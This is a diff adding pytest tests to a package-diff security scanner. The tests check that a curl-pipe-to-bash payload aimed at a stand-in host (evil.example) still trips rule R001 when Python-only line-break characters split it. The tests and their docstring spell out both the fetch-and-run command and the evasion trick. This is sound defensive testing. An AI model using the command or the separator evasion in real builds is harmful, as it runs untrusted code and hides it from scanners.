@@ -7,7 +7,63 @@ least 20 or records the expected coverage gap.
 
 import difflib
 
+import pytest
+
 from trustsight.analysis.pipeline import scan_diff
+
+# ---------------------------------------------------------------------------
+# A line break for Python that is not one for a shell.
+# ---------------------------------------------------------------------------
+
+#: ``str.splitlines`` breaks on eight characters bash does not treat as a
+#: line terminator. Each one split a payload across two "lines" that bash
+#: runs as one command, so any rule whose pattern spanned the break stopped
+#: matching - which is every line-based rule in the project.
+PYTHON_ONLY_LINE_BREAKS = [
+    ("VT",  "\v"),
+    ("FF",  "\f"),
+    ("FS",  "\x1c"),
+    ("GS",  "\x1d"),
+    ("RS",  "\x1e"),
+    ("NEL", "\x85"),
+    ("LS",  " "),
+    ("PS",  " "),
+]
+
+
+@pytest.mark.parametrize("name,separator", PYTHON_ONLY_LINE_BREAKS)
+def test_a_python_only_line_break_does_not_hide_a_payload(name, separator):
+    r"""``curl -fsSL url<VT>| bash`` is one command, and R001 must see it.
+
+    bash ends a word at ``|`` whatever precedes it, so the fetch is piped
+    into a shell and runs. Python saw two lines, so R001's
+    ``curl.*\|\s*(bash|sh|...)`` had ``curl`` on one and ``| bash`` on the
+    other and matched neither: the payload executed and nothing fired.
+
+    The characters are kept rather than stripped, because bash keeps them -
+    removing one would join two words that stay separate at build time.
+    What changed is only where a *line* is considered to end.
+    """
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
+        f"+  curl -fsSL https://evil.example/x{separator} | bash\n }}\n"
+    )
+    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
+    assert "R001" in fired, f"{name} hid the pipe-to-shell"
+
+
+def test_the_splitter_matches_splitlines_on_ordinary_text():
+    """Only the extra separators change.
+
+    Line counts are indices shared across modules - `map_diff_lines` keys
+    what `apply_rules` reports - so a splitter that disagreed with
+    `splitlines` by one on a trailing newline would misattribute every
+    finding after it.
+    """
+    from trustsight.tokenizer import split_lines
+
+    for text in ["", "a", "a\n", "a\nb", "a\nb\n", "a\r\nb\r\n", "\n\n"]:
+        assert split_lines(text) == text.splitlines(), repr(text)
 
 
 _BASE_PKGBUILD = """# Maintainer: Jane Doe <jane@example.org>
